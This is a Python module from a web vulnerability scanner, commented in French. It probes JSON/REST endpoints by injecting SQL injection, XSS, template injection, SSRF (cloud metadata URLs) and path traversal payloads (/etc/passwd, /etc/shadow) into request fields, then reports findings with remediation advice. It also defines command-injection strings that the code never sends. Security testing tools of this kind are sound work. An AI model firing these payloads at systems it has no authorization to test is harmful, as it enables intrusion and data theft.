"""
PhantomScan — JSON/REST API Scanner  (v5.7)
============================================
Angle mort historique : les modules XSS/SQLi/SSTI injectaient UNIQUEMENT
en form-urlencoded ou query string. Si la cible répond en application/json
et consomme des corps JSON, aucun payload n'était testé dans le body JSON.

Ce module détecte et attaque les APIs REST/JSON :
  1. Détection automatique : endpoints qui retournent application/json ou
     qui acceptent Content-Type: application/json.
  2. Inférence de schéma : reconstruit le schéma JSON à partir des réponses
     de la cible (GET de l'endpoint) et de l'EndpointBus.
  3. Fuzzing : pour chaque champ string du body, injecte :
       - SQLi error-based (', ", OR 1=1--)
       - XSS (<script>alert(1)</script>, <img onerror=...>)
       - SSTI ({{7*7}}, ${7*7}, #{7*7})
       - CMDi (;id, `id`, $(id))
       - SSRF (http://169.254.169.254/...)
       - Path traversal (../../../etc/passwd)
  4. Détection : analyse la réponse (erreurs SQL, réflexion de payload,
     timing anormal) pour confirmer la vulnérabilité.
"""

from __future__ import annotations

import asyncio
import json
import re
import time
from typing import AsyncIterator, Any
from urllib.parse import urlparse

from phantomscan.config import PhantomConfig
from phantomscan.core.requester import Requester, ProbeRequest
from phantomscan.core.heuristic import HeuristicEngine
from phantomscan.output.reporter import Finding, Severity
from phantomscan.core.scanner_mixin import ScannerMixin


# ─────────────────────────── Payloads par type de vuln ──────────────────────

_SQLI_PAYLOADS: list[tuple[str, str]] = [
    ("'", "single quote"),
    ('"', "double quote"),
    ("' OR '1'='1", "OR true"),
    ("' OR 1=1--", "OR 1=1"),
    ("'; SELECT 1--", "stacked query"),
    ("1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "MySQL extractvalue"),
]

_SQL_ERROR_PATTERNS = [
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"unclosed quotation mark", re.I),
    re.compile(r"quoted string not properly terminated", re.I),
    re.compile(r"pg_query.*ERROR", re.I),
    re.compile(r"ERROR:\s+syntax error at or near", re.I),
    re.compile(r"sqlite3\.operationalerror", re.I),
    re.compile(r"ORA-\d{4,5}:", re.I),
    re.compile(r"SQLSTATE\[", re.I),
    re.compile(r"java\.sql\.SQLException", re.I),
]

_XSS_MARKER = "PSj4xss7"
_XSS_PAYLOADS: list[tuple[str, str]] = [
    (f'<script>alert("{_XSS_MARKER}")</script>', "script tag"),
    (f'"><img src=x onerror=alert("{_XSS_MARKER}")>', "img onerror"),
    (f'<svg onload=alert("{_XSS_MARKER}")>', "svg onload"),
]

_SSTI_PAYLOADS: list[tuple[str, str, str]] = [
    ("{{7*7}}", "49", "Jinja2/Twig"),
    ("${7*7}", "49", "FreeMarker/Spring EL"),
    ("<%= 7*7 %>", "49", "ERB/JSP"),
    ("#{7*7}", "49", "Ruby/Pebble"),
    ("*{7*7}", "49", "Thymeleaf"),
]

_CMDI_PAYLOADS: list[tuple[str, str]] = [
    (";id", "semicolon id"),
    ("`id`", "backtick id"),
    ("$(id)", "dollar-paren id"),
    ("| id", "pipe id"),
    ("& id", "ampersand id"),
]

_CMDI_INDICATORS = re.compile(r'\buid=\d+|root:|daemon:|www-data:', re.I)

_SSRF_PAYLOADS: list[tuple[str, str]] = [
    ("http://169.254.169.254/latest/meta-data/", "AWS IMDSv1"),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP Metadata"),
    ("http://localhost/", "Localhost"),
    ("http://127.0.0.1/", "Loopback"),
]
_SSRF_INDICATORS = re.compile(r'ami-id|instance-id|computeMetadata|root:x:0:0|redis_version', re.I)

_PATH_PAYLOADS: list[str] = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "../../../../etc/shadow",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]
_PATH_INDICATORS = re.compile(r'root:x:0:0|daemon:x:|bin/bash|\[extensions\]', re.I)

TIME_SLEEP = 5

_SQLI_TIME_PAYLOADS: list[str] = [
    f"' AND SLEEP({TIME_SLEEP})--",
    f'" AND SLEEP({TIME_SLEEP})--',
    f"'; WAITFOR DELAY '0:0:{TIME_SLEEP}'--",
    f"1; SELECT pg_sleep({TIME_SLEEP})--",
]


# ─────────────────────────── Helpers ────────────────────────────────────────

def _is_json_endpoint(resp) -> bool:
    ct = resp.headers.get("content-type", "")
    return "application/json" in ct or "text/json" in ct


def _infer_schema(obj: Any, path: str = "") -> list[tuple[str, type]]:
    """
    Retourne [(json_path, type)] pour tous les champs scalaires de l'objet.
    Exemple: {"user": {"name": "alice"}} → [("user.name", str)]
    """
    results: list[tuple[str, type]] = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            results.extend(_infer_schema(v, f"{path}.{k}" if path else k))
    elif isinstance(obj, list) and obj:
        results.extend(_infer_schema(obj[0], f"{path}[0]"))
    elif isinstance(obj, str):
        results.append((path, str))
    elif isinstance(obj, (int, float)):
        results.append((path, type(obj)))
    return results


def _inject_at_path(obj: Any, path: str, payload: Any) -> Any:
    """Retourne une copie de obj avec le champ à `path` remplacé par `payload`."""
    import copy
    result = copy.deepcopy(obj)
    parts = path.replace("[0]", ".0").split(".")
    node = result
    for part in parts[:-1]:
        if isinstance(node, list):
            node = node[int(part)]
        else:
            node = node[part]
    last = parts[-1]
    if isinstance(node, list):
        node[int(last)] = payload
    else:
        node[last] = payload
    return result


# ─────────────────────────── Scanner ────────────────────────────────────────

class JSONAPIScanner(ScannerMixin):
    """
    Détecte et attaque les endpoints REST/JSON.

    Activé via scan.json_api = True (ajouté à ScanConfig v5.7).
    S'intègre au bus d'endpoints pour tester tous les endpoints découverts.
    """

    def __init__(self, req: Requester, heuristic: HeuristicEngine, cfg: PhantomConfig) -> None:
        self._req = req
        self._heur = heuristic
        self._cfg = cfg
        self._bus = None

    def set_endpoint_bus(self, bus) -> None:
        self._bus = bus

    async def run(self, target: str) -> AsyncIterator[Finding]:
        """Point d'entrée principal."""
        endpoints_to_test: list[tuple[str, str]] = []  # (url, method)

        # Tester l'URL cible elle-même
        endpoints_to_test.append((target, "GET"))

        # Endpoints du bus
        if self._bus is not None:
            for ep in self._bus.snapshot:
                endpoints_to_test.append((ep.url, ep.method))

        # Endpoints REST courants à sonder
        base = target.rstrip("/")
        common_api_paths = [
            "/api/v1/users", "/api/v1/products", "/api/v1/items",
            "/api/users", "/api/items", "/api/search",
            "/v1/users", "/v2/users", "/graphql",
        ]
        parsed = urlparse(target)
        for path in common_api_paths:
            endpoints_to_test.append((f"{parsed.scheme}://{parsed.netloc}{path}", "GET"))

        seen: set[tuple[str, str]] = set()
        for url, method in endpoints_to_test:
            key = (url, method)
            if key in seen:
                continue
            seen.add(key)
            async for f in self._probe_endpoint(url, method):
                yield f

    async def _probe_endpoint(self, url: str, method: str) -> AsyncIterator[Finding]:
        """
        Sonde un endpoint pour détecter s'il consomme du JSON, puis injecte
        les payloads dans chaque champ string du body.
        """
        # Étape 1 : GET de l'endpoint pour détecter JSON et inférer le schéma
        resp = await self._req.get(url)
        if resp.error or resp.status in (404, 410):
            return

        if not _is_json_endpoint(resp):
            # Tenter quand même un POST avec Content-Type: application/json
            # pour voir si l'endpoint accepte du JSON même si le GET ne retourne pas JSON
            test_resp = await self._req.send(ProbeRequest(
                method="POST",
                url=url,
                headers={"Content-Type": "application/json"},
                body=json.dumps({"test": "phantomscan"}),
            ))
            if test_resp.error or not _is_json_endpoint(test_resp):
                # Vérifier si le POST avec JSON est accepté différemment du urlencoded
                if test_resp.error or test_resp.status in (404, 410, 415):
                    return
                # 400/422 = l'endpoint attend du JSON mais payload invalide → continuer
                if test_resp.status not in (400, 422, 200, 201):
                    return

        # Étape 2 : inférer le schéma depuis la réponse GET
        base_obj: dict = {}
        if resp.body.strip():
            try:
                parsed_body = json.loads(resp.body)
                if isinstance(parsed_body, list) and parsed_body:
                    base_obj = parsed_body[0] if isinstance(parsed_body[0], dict) else {}
                elif isinstance(parsed_body, dict):
                    base_obj = parsed_body
            except (json.JSONDecodeError, ValueError):
                pass

        # Si pas de schéma inférable, utiliser un objet générique
        if not base_obj:
            base_obj = {"id": 1, "name": "test", "query": "test", "value": "test"}

        fields = _infer_schema(base_obj)
        string_fields = [(path, t) for path, t in fields if t == str]

        if not string_fields:
            # Ajouter des champs génériques si aucun champ string trouvé
            string_fields = [("name", str), ("query", str), ("value", str)]
            base_obj = {"name": "test", "query": "test", "value": "test"}

        # Étape 3 : injecter les payloads dans chaque champ string
        for field_path, _ in string_fields:
            async for f in self._fuzz_field(url, base_obj, field_path):
                yield f
                # Ne pas saturer : 1 finding par champ maximum pour les findings critiques
                break

    async def _fuzz_field(
        self, url: str, base_obj: dict, field_path: str
    ) -> AsyncIterator[Finding]:
        """Injecte tous les types de payloads dans un champ donné."""

        # ── SQLi error-based ────────────────────────────────────────────────
        for payload, desc in _SQLI_PAYLOADS:
            fuzzed = _inject_at_path(base_obj, field_path, payload)
            resp = await self._req.send(ProbeRequest(
                method="POST",
                url=url,
                headers={"Content-Type": "application/json"},
                body=json.dumps(fuzzed),
            ))
            if resp.error or resp.status in (404, 410):
                continue
            for pat in _SQL_ERROR_PATTERNS:
                if pat.search(resp.body):
                    yield Finding(
                        title=f"SQLi JSON — Error-based · champ `{field_path}`",
                        severity=Severity.CRITICAL,
                        url=url,
                        module="vulns/json_api",
                        description=(
                            f"Erreur SQL détectée dans la réponse JSON via le champ `{field_path}`. "
                            f"Payload: {payload!r}. La cible n'utilise pas de requêtes paramétrées."
                        ),
                        evidence=f"POST {url} | JSON field={field_path} | payload={payload[:60]} | match={pat.pattern[:40]}",
                        cwe="CWE-89",
                        remediation="Utiliser des requêtes paramétrées. Ne jamais interpoler du JSON dans des requêtes SQL.",
                    )
                    return

        # ── SQLi time-based ─────────────────────────────────────────────────
        baseline_resp = await self._req.get(url)
        baseline_ms = baseline_resp.elapsed_ms if not baseline_resp.error else 500.0

        for payload in _SQLI_TIME_PAYLOADS:
            fuzzed = _inject_at_path(base_obj, field_path, payload)
            t0 = time.monotonic()
            resp = await self._req.send(ProbeRequest(
                method="POST",
                url=url,
                headers={"Content-Type": "application/json"},
                body=json.dumps(fuzzed),
                timeout=TIME_SLEEP + 12,
            ))
            elapsed = (time.monotonic() - t0) * 1000
            threshold = baseline_ms + TIME_SLEEP * 1000 * 0.8
            if not resp.error and elapsed >= threshold:
                # Double confirmation
                t1 = time.monotonic()
                resp2 = await self._req.send(ProbeRequest(
                    method="POST",
                    url=url,
                    headers={"Content-Type": "application/json"},
                    body=json.dumps(fuzzed),
                    timeout=TIME_SLEEP + 12,
                ))
                elapsed2 = (time.monotonic() - t1) * 1000
                if not resp2.error and elapsed2 >= threshold:
                    yield Finding(
                        title=f"SQLi JSON — Time-based blind · champ `{field_path}`",
                        severity=Severity.CRITICAL,
                        url=url,
                        module="vulns/json_api",
                        description=(
                            f"Délai artificiel confirmé via le champ JSON `{field_path}`. "
                            f"Payload: {payload!r}. Mesure1: {elapsed:.0f}ms, Mesure2: {elapsed2:.0f}ms."
                        ),
                        evidence=f"POST {url} | field={field_path} | baseline={baseline_ms:.0f}ms | Δ={elapsed:.0f}ms/{elapsed2:.0f}ms",
                        cwe="CWE-89",
                        remediation="Utiliser des requêtes paramétrées.",
                    )
                    return

        # ── XSS réfléchi dans JSON ───────────────────────────────────────────
        for payload, desc in _XSS_PAYLOADS:
            fuzzed = _inject_at_path(base_obj, field_path, payload)
            resp = await self._req.send(ProbeRequest(
                method="POST",
                url=url,
                headers={"Content-Type": "application/json"},
                body=json.dumps(fuzzed),
            ))
            if resp.error or resp.status in (404, 410):
                continue
            if _XSS_MARKER in resp.body and payload in resp.body:
                yield Finding(
                    title=f"XSS Réfléchi JSON — {desc} · champ `{field_path}`",
                    severity=Severity.HIGH,
                    url=url,
                    module="vulns/json_api",
                    description=(
                        f"Payload XSS réfléchi sans encodage dans la réponse JSON "
                        f"via le champ `{field_path}`. L'API renvoie les données sans assainissement."
                    ),
                    evidence=f"POST {url} | JSON field={field_path} | payload={payload[:60]}",
                    cwe="CWE-79",
                    remediation="Encoder les sorties JSON. Définir Content-Type: application/json strict (pas text/html).",
                )
                break

        # ── SSTI dans JSON ──────────────────────────────────────────────────
        for template_payload, expected, engine in _SSTI_PAYLOADS:
            fuzzed = _inject_at_path(base_obj, field_path, template_payload)
            resp = await self._req.send(ProbeRequest(
                method="POST",
                url=url,
                headers={"Content-Type": "application/json"},
                body=json.dumps(fuzzed),
            ))
            if resp.error or resp.status in (404, 410):
                continue
            if expected in resp.body:
                yield Finding(
                    title=f"SSTI JSON — {engine} · champ `{field_path}`",
                    severity=Severity.CRITICAL,
                    url=url,
                    module="vulns/json_api",
                    description=(
                        f"Template injection détectée via le champ JSON `{field_path}`. "
                        f"Payload `{template_payload}` → résultat `{expected}` dans la réponse. "
                        f"Moteur probable: {engine}."
                    ),
                    evidence=f"POST {url} | field={field_path} | payload={template_payload} | result={expected}",
                    cwe="CWE-94",
                    remediation="Ne jamais passer des données utilisateur dans un moteur de template. Utiliser des templates statiques.",
                )
                return

        # ── SSRF via JSON ────────────────────────────────────────────────────
        for ssrf_payload, ssrf_desc in _SSRF_PAYLOADS:
            fuzzed = _inject_at_path(base_obj, field_path, ssrf_payload)
            resp = await self._req.send(ProbeRequest(
                method="POST",
                url=url,
                headers={"Content-Type": "application/json"},
                body=json.dumps(fuzzed),
            ))
            if resp.error or resp.status in (404, 410):
                continue
            if _SSRF_INDICATORS.search(resp.body):
                yield Finding(
                    title=f"SSRF JSON — {ssrf_desc} · champ `{field_path}`",
                    severity=Severity.CRITICAL,
                    url=url,
                    module="vulns/json_api",
                    description=(
                        f"SSRF confirmé via le champ JSON `{field_path}`. "
                        f"Payload: {ssrf_payload}. Indicateur détecté dans la réponse."
                    ),
                    evidence=f"POST {url} | field={field_path} | payload={ssrf_payload} | indicator={_SSRF_INDICATORS.pattern[:40]}",
                    cwe="CWE-918",
                    remediation="Valider les URLs fournies par l'utilisateur. Utiliser une allowlist de domaines.",
                )
                return

        # ── Path traversal via JSON ──────────────────────────────────────────
        for path_payload in _PATH_PAYLOADS:
            fuzzed = _inject_at_path(base_obj, field_path, path_payload)
            resp = await self._req.send(ProbeRequest(
                method="POST",
                url=url,
                headers={"Content-Type": "application/json"},
                body=json.dumps(fuzzed),
            ))
            if resp.error or resp.status in (404, 410):
                continue
            if _PATH_INDICATORS.search(resp.body):
                yield Finding(
                    title=f"Path Traversal JSON · champ `{field_path}`",
                    severity=Severity.CRITICAL,
                    url=url,
                    module="vulns/json_api",
                    description=(
                        f"Path traversal confirmé via le champ JSON `{field_path}`. "
                        f"Payload: {path_payload!r}."
                    ),
                    evidence=f"POST {url} | field={field_path} | payload={path_payload}",
                    cwe="CWE-22",
                    remediation="Valider et canonicaliser les chemins de fichiers. Ne jamais utiliser des inputs utilisateur pour construire des chemins.",
                )
                return
